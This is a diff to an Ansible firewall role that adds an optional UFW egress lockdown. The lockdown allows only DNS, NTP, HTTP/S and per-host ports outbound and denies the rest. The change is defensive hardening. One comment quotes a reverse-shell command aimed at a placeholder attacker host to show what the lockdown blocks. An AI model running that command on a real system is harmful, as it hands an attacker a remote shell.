@@ -9,10 +9,48 @@
     direction: incoming
     policy: deny
 
-- name: UFW default allow outgoing
+# --- Outbound policy ---------------------------------------------------
+# Default: allow all outbound (most servers need it). Optional egress
+# lockdown flips this to default-deny and only permits the ports a
+# hardened box actually needs, which stops the most common reverse
+# shells (e.g. bash -i >& /dev/tcp/attacker/4444) since arbitrary
+# high-port callbacks are refused. Note: 80/443 stay open for apt,
+# certbot, B2 and Telegram, so C2 tunnelled over 443 is NOT stopped by
+# this alone - that is what the detection layers (role 09) are for.
+- name: UFW default allow outgoing (egress lockdown disabled)
   community.general.ufw:
     direction: outgoing
     policy: allow
+  when: not (egress_lockdown | default(false))
+
+- name: Egress lockdown block
+  when: egress_lockdown | default(false)
+  block:
+    - name: Allow required outbound ports (DNS, NTP, HTTP/S)
+      community.general.ufw:
+        rule: allow
+        direction: out
+        port: "{{ item.port }}"
+        proto: "{{ item.proto }}"
+      loop:
+        - { port: "53", proto: udp }
+        - { port: "53", proto: tcp }
+        - { port: "123", proto: udp }
+        - { port: "80", proto: tcp }
+        - { port: "443", proto: tcp }
+
+    - name: Allow extra outbound ports (configured per host)
+      community.general.ufw:
+        rule: allow
+        direction: out
+        port: "{{ item.port | string }}"
+        proto: "{{ item.proto | default('tcp') }}"
+      loop: "{{ egress_allow_extra | default([]) }}"
+
+    - name: UFW default deny outgoing
+      community.general.ufw:
+        direction: outgoing
+        policy: deny
 
 - name: Allow HTTP and HTTPS
   community.general.ufw:
